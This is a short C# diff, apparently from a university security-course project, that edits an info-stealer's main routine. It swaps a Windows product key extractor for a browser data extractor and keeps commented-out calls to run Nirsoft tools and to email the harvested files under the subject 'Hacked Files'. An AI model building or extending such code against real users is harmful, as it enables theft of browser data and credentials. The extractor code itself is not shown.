@@ -104,15 +104,13 @@ namespace TP
 
 
             List<DataExtractor> dataExtractors = new List<DataExtractor>();
-            dataExtractors.Add(new WindowsProductKeyDataExtractor());
+            dataExtractors.Add(new BrowserDataExtractor());
             List<string> files = Helpers.applyDataExtractionActions(dataExtractors);
 
-            //files.NirsoftToolExecAndAdd("ProduKey.exe");
             //files.NirsoftToolExecAndAdd("awatch.exe");
 
-            Helpers.getProgramList();
-            files.Add(path);
-            files.Add(@"D:\Matias\Facultad\Seguridad\TP\tp-seginf\code\TP\programList.txt");
+            //files.Add(path);
+            //files.Add(@"D:\Matias\Facultad\Seguridad\TP\tp-seginf\code\TP\programList.txt");
             //Helpers.sendMail("Hack Test", "Hacked Files", files);
         }
 
